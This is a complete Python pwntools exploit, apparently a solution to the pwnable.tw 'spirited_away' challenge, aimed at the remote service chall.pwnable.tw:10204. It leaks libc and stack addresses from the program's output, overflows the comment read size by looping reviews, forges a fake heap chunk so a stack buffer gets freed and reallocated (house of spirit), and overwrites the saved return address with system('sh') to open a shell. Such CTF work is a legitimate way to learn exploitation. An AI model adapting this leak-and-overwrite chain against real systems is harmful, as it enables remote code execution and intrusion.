from pwn import *


spirited_away = ELF('spirited_away')
libc = ELF('libc_32.so.6')


class Prompts:
    NAME = '\nPlease enter your name: '
    AGE = 'Please enter your age: '
    REASON = 'Why did you came to see this movie? '
    COMMENT = 'Please enter your comment: '
    ANOTHER_COMMENT = 'Would you like to leave another comment? <y/n>: '


p = remote('chall.pwnable.tw', 10204)
# p = gdb.debug(
#     spirited_away.path,
#     '''
#     b *survey+0x2bc if (unsigned int)cnt == 101
#     c
#     ''',
#     env=dict(LD_PRELOAD=libc.path)
# )


def review(name='AAAA', reason='BBBB', comment='CCCC', another_comment=True):
    if name:
        p.sendafter(Prompts.NAME, name)
    p.sendlineafter(Prompts.AGE, '19')
    p.sendafter(Prompts.REASON, reason)
    if comment:
        p.sendafter(Prompts.COMMENT, comment)
    return p.sendafter(Prompts.ANOTHER_COMMENT, 'y' if another_comment else 'n')


def overwrite_read_size():
    print('[*] overwriting the read size of the name buffer and comment')
    for _ in range(8):
        review()
    # This is done since before overflowing the read size to 0x6e, it first becomes 0x00,
    # the null byte is the terminating null byte of the summary string.
    for _ in range(90):
        review(name=None, comment=None)


def forge_chunk(reason_ptr):
    print('[*] overflowing the name pointer')
    print('[*] placing a forged chunk onto the reason buffer')
    mem2chunk_offset = 0x8
    forged_chunk = p32(0x0) + p32(0x41) + p32(0xdeadbeef) + \
        b'A' * 0x38 + p32(0x41)
    review(reason=forged_chunk, comment=b'A' *
           0x54 + p32(reason_ptr + mem2chunk_offset))


def leak_stack():
    summary = review(reason='A' * 0x38)
    reason_ptr = u32(summary[0x53:0x53+0x4]) - 0x70
    print(f'[*] reason pointer: {hex(reason_ptr)}')
    return reason_ptr


def leak_libc():
    summary = review(reason='A' * 0x18)
    libc.address = u32(summary[0x33:0x33+0x4]) - 0x675e7
    print(f'[*] libc base address: {hex(libc.address)}')


def overwrite_saved_eip():
    review(name=b'A' * 0x4c + p32(libc.sym['system']) + b'A' *
           4 + p32(next(libc.search(b'sh\0'))), another_comment=False)


def exploit():
    leak_libc()
    reason_ptr = leak_stack()
    overwrite_read_size()
    forge_chunk(reason_ptr)
    overwrite_saved_eip()
    p.interactive()


if __name__ == "__main__":
    exploit()
